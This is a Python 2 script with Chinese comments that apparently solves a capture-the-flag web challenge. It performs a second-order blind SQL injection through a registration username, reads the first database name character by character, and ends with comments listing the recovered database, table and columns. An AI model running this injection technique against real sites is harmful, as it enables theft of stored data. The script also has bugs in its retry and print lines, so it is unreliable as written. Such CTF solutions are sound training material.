#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = 'T1m0n'

import requests


def getdata(pos, payload_chr):
    """
    : 这段代码是当时做题的一部分，是用来获取当前数据库中的库第一个
    :param pos: 盲注点
    :param payload_chr: 字符串
    :return: 如果pos位置是payload_chr则返回payload_chr反之则返回空
    """
    # 当时网络环境比较差，经常出现502的情况，使用try当返回502或者其他时再次执行本函数
    try:
        # 用户名 注意看后面的payload，这里的payload的意义为返回第一个数据库，并按位截取
        user = 'zaaaaaa\'/**/and/**/ascii(substr((SELECT/**/(SCHEMA_NAME)/**/FROM/**/information_schema.SCHEMATA/**/limit/**/0,1),%d,1))=%d/**/and/**/\'1\'=\'1' % (
            pos, ord(payload_chr))
        # 密码 只在登录时起到作用
        passwd = 'aaaaaa'
        # 注册机登录的url
        url_login = 'http://web.l-ctf.com:55533/check.php'
        # 注册时post的数据
        resign_data = {
            'user': user,
            'pass': passwd,
            'vrtify': '1',
            'typer': '0',
            'register': '%E6%B3%A8%E5%86%8C',
        }
        # 负责发送注册请求
        r0 = requests.post(url_login, resign_data)
        r0.close()
        # 登录刚才注册的账号
        login_data = {
            'user': user,
            'pass': passwd,
            'vrtify': '1',
            'typer': '0',
            'login': '%E7%99%BB%E9%99%86',
        }
        r1 = requests.post(url_login, login_data)
        # 截取返回头中的cookie，方便我们进行下一步的登录用户中心
        cookie = r1.headers['Set-Cookie'].split(';')[0]
        r1.close()
        # 用户中心登录
        url_center = 'http://web.l-ctf.com:55533/ucenter.php'
        headers = {'cookie': cookie}
        # 登录用户中心
        r2 = requests.get(url_center, headers=headers)
        res = r2.content
        # 如果返回的长度大于700，则证明这个位置的字符串正确，返回这个字符串，如果小于700则返回空
        if len(res) > 700:
            print
            payload_chr, ord(payload_chr)
            return payload_chr
        else:
            print '.',
            return ''
    except:
        getdata(pos, payload_chr)


if __name__ == '__main__':
    payloads = 'abcdefghijklmnopqrstuvwxyz1234567890@_{},'
    res = ''
    for pos in range(1, 20):
        for payload in payloads:
            res += getdata(pos, payload)
    print res

# 附上当时的注入结果
# user--lctf
# database--web_200
# table -- user
# column -- d,admin,pass
